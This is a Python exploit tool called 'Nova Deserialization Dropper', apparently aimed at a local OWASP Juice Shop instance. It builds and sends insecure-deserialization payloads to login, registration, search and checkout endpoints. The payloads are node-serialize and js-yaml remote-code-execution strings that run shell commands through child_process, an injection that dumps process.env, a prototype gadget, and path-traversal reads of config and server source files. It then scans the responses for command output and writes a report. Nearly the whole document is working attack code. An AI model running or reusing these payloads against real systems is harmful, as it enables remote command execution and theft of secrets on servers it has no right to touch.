#!/usr/bin/env python3
"""
NOVA DESERIALIZATION DROPPER v1.0
Insecure deserialization exploitation engine.
Targets: node-serialize, js-yaml, JSON.parse() abuse,
IIFE injection, and prototype pollution gadget chains.
Uses file paths from Adaptive Brain for precision strikes.
"""

import json
import re
import time
import requests
from datetime import datetime
from typing import Dict, List, Optional


class NovaDeserializeDropper:
    """
    Deserialization attack engine.
    Uses file paths leaked by Adaptive Brain to craft
    gadget chains specific to the target application.
    """

    def __init__(self, base_url="http://localhost:3000", leaked_paths=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Nova/5.0 (Deserialize Dropper)",
            "Accept": "application/json",
            "Content-Type": "application/json",
        })
        self.leaked_paths = leaked_paths or []
        self.gadget_chains = []
        self.findings = []

    # ---------- GADGET CHAIN GENERATOR ----------
    def generate_gadget_chains(self) -> List[Dict]:
        """Generate deserialization gadget chains based on leaked paths."""
        chains = []

        # Extract framework from leaked paths
        is_express = any("express" in p.lower() or "angular" in p.lower() for p in self.leaked_paths)
        is_node = any(".js" in p for p in self.leaked_paths)
        has_routes = any("routes" in p for p in self.leaked_paths)

        # node-serialize RCE gadget (most common Node.js deserialization vuln)
        chains.append({
            "name": "node-serialize RCE",
            "type": "rce",
            "framework": "node-serialize",
            "payload_template": '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'{CMD}\', function(error, stdout, stderr) { console.log(stdout) });}()"}',
            "test_command": "id",
            "indicators": ["uid=", "gid=", "groups="],
        })

        # js-yaml deserialization
        chains.append({
            "name": "js-yaml RCE",
            "type": "rce",
            "framework": "js-yaml",
            "payload_template": 'test: !!js/function >\n  function() {\n    return require("child_process").execSync("{CMD}").toString();\n  }',
            "test_command": "whoami",
            "indicators": ["root", "u0_a"],
        })

        # JavaScript IIFE injection via JSON
        chains.append({
            "name": "IIFE JSON Injection",
            "type": "code_execution",
            "framework": "generic",
            "payload_template": '{"data": "test", "exec": (function(){ return process.env; })()}',
            "test_command": None,
            "indicators": ["NODE_ENV", "HOME", "PATH"],
        })

        # Constructor override gadget
        chains.append({
            "name": "Constructor Override",
            "type": "prototype_chain",
            "framework": "generic",
            "payload_template": '{"constructor": {"prototype": {"shell": "/bin/sh", "input": "{CMD}"}}}',
            "test_command": "id",
            "indicators": ["uid=", "gid="],
        })

        # File read via path traversal in deserialization
        if self.leaked_paths:
            for path in self.leaked_paths[:3]:
                # Generate paths to sensitive files based on leaked structure
                base_dir = "/".join(path.split("/")[:-2]) if "/" in path else path
                sensitive_files = [
                    f"{base_dir}/config/default.yml",
                    f"{base_dir}/data/datacreator.js",
                    f"{base_dir}/routes/verify.js",
                    f"{base_dir}/../package.json",
                    f"{base_dir}/../server.js",
                ]
                for target_file in sensitive_files:
                    chains.append({
                        "name": f"File Read: {target_file.split('/')[-1]}",
                        "type": "file_read",
                        "framework": "path_traversal",
                        "payload_template": '{"file": "' + target_file + '"}',
                        "test_command": None,
                        "indicators": ["module.exports", "require(", "app.use"],
                    })

        self.gadget_chains = chains
        return chains

    # ---------- PAYLOAD DELIVERY ----------
    def test_gadget_chain(self, endpoint: str, chain: Dict, method="POST") -> Dict:
        """Test a single gadget chain against an endpoint."""
        result = {
            "endpoint": endpoint,
            "chain": chain["name"],
            "type": chain["type"],
            "success": False,
            "evidence": "",
            "command_output": "",
        }

        url = f"{self.base_url}{endpoint}"
        payload_str = chain["payload_template"]

        if chain.get("test_command"):
            payload_str = payload_str.replace("{CMD}", chain["test_command"])

        try:
            # Send as JSON
            resp = self.session.post(url, data=payload_str, 
                headers={"Content-Type": "application/json"}, timeout=10)
            
            # Check indicators
            if chain.get("indicators"):
                for indicator in chain["indicators"]:
                    if indicator in resp.text:
                        result["success"] = True
                        result["evidence"] = resp.text[:500]
                        # Extract command output
                        if "uid=" in resp.text:
                            match = re.search(r'(uid=\d+[^\n]*)', resp.text)
                            if match:
                                result["command_output"] = match.group(1)
                        break

            # Also check for unexpected 200 with content (possible blind RCE)
            if not result["success"] and resp.status_code == 200 and len(resp.text) > 50:
                if "error" not in resp.text.lower() and "invalid" not in resp.text.lower():
                    result["partial_success"] = True
                    result["evidence"] = resp.text[:300]

        except Exception as e:
            result["error"] = str(e)[:200]

        # Also try as URL-encoded form data
        if not result.get("success") and not result.get("partial_success"):
            try:
                resp = self.session.post(url, data={"payload": payload_str}, timeout=10)
                if chain.get("indicators"):
                    for indicator in chain["indicators"]:
                        if indicator in resp.text:
                            result["success"] = True
                            result["evidence"] = resp.text[:500]
                            break
            except:
                pass

        if result.get("success"):
            self.findings.append(result)
            print(f"     🔥 GADGET CHAIN WORKS! [{chain['name']}]")
            if result.get("command_output"):
                print(f"        Output: {result['command_output']}")

        return result

    # ---------- FULL ATTACK ----------
    def run_dropper(self, endpoints: List[str] = None) -> Dict:
        """Execute all deserialization gadget chains against targets."""
        print("""
╔══════════════════════════════════════════════╗
║                                              ║
║   💣 NOVA DESERIALIZATION DROPPER v1.0     ║
║   Gadget Chain Exploitation Engine         ║
║                                              ║
╚══════════════════════════════════════════════╝
        """)

        if endpoints is None:
            endpoints = [
                "/rest/user/login",
                "/rest/user/register",
                "/api/Feedbacks",
                "/rest/products/search",
                "/rest/order-history",
                "/rest/basket/1/checkout",
            ]

        # Generate chains based on leaked paths
        chains = self.generate_gadget_chains()
        print(f"\n📦 Generated {len(chains)} gadget chains")
        print(f"   Based on {len(self.leaked_paths)} leaked file paths")
        for chain in chains:
            print(f"   ⛓️  {chain['name']} ({chain['type']})")

        report = {
            "timestamp": datetime.now().isoformat(),
            "target": self.base_url,
            "gadget_chains_tested": len(chains),
            "endpoints_tested": len(endpoints),
            "successful_chains": [],
            "findings": [],
        }

        for endpoint in endpoints:
            print(f"\n🎯 Testing: {endpoint}")
            for chain in chains[:8]:  # Top 8 most promising
                result = self.test_gadget_chain(endpoint, chain)
                if result.get("success"):
                    report["successful_chains"].append({
                        "endpoint": endpoint,
                        "chain": chain["name"],
                        "evidence": result.get("evidence", "")[:300],
                        "command_output": result.get("command_output", ""),
                    })
                time.sleep(0.05)

        report["findings"] = self.findings

        # Save
        with open("nova_deserialize_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)

        print(f"""
╔══════════════════════════════════════════╗
║   DESERIALIZATION DROPPER SUMMARY      ║
╠══════════════════════════════════════════╣
║  Chains Tested:      {report['gadget_chains_tested']:>3}               ║
║  Endpoints Tested:   {report['endpoints_tested']:>3}               ║
║  Successful:         {len(report['successful_chains']):>3}               ║
╚══════════════════════════════════════════╝
        """)

        if report["successful_chains"]:
            print("\n🔥 SUCCESSFUL DESERIALIZATION ATTACKS:")
            for s in report["successful_chains"]:
                print(f"   💥 {s['endpoint']} — {s['chain']}")

        return report


if __name__ == "__main__":
    # Use leaked paths from Adaptive Brain
    leaked_paths = [
        "/data/data/com.termux/files/home/juice-shop/build/routes/angular.js",
        "/data/data/com.termux/files/home/juice-shop/build/routes/orderHistory.js",
        "/data/data/com.termux/files/home/juice-shop/build/routes/login.js",
    ]
    
    dropper = NovaDeserializeDropper(leaked_paths=leaked_paths)
    report = dropper.run_dropper()
